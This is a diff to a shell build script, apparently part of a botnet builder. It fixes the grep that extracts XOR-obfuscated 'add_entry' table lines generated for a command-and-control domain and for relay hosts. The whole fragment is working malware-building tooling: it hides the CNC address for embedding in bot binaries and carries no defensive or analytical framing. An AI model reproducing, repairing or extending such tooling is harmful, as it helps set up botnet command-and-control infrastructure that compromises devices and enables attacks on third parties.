@@ -232,7 +232,8 @@ fi
 # Generate XOR-obfuscated table entry for the CNC domain
 log INFO "Generating encrypted table entry for domain: $CNC_DOMAIN"
 python3 "$SCRIPT_DIR/generate_table.py" "$CNC_DOMAIN" > /tmp/table_entry.txt 2>&1
-TABLE_ENTRY=$(grep "add_entry" /tmp/table_entry.txt | head -1)
+# Extract just the actual add_entry() code line (starts with spaces + add_entry, not comments)
+TABLE_ENTRY=$(grep "^    add_entry" /tmp/table_entry.txt | head -1)
 if [ -z "$TABLE_ENTRY" ]; then
     log ERROR "Failed to generate table entry for domain! Check generate_table.py or python3 installation."
     log ERROR "Contents of /tmp/table_entry.txt:"
@@ -262,7 +263,7 @@ if [ "$USE_RELAY" -eq 1 ] && [ ${#RELAY_HOSTS[@]} -gt 0 ]; then
         fi
         
         python3 "$SCRIPT_DIR/generate_table.py" "$RELAY" > /tmp/relay_entry.txt 2>&1
-        RELAY_ENTRY=$(grep "add_entry" /tmp/relay_entry.txt | head -1)
+        RELAY_ENTRY=$(grep "^    add_entry" /tmp/relay_entry.txt | head -1)
         if [ -z "$RELAY_ENTRY" ]; then
             log ERROR "Failed to generate table entry for relay $RELAY! Contents of /tmp/relay_entry.txt:"
             cat /tmp/relay_entry.txt
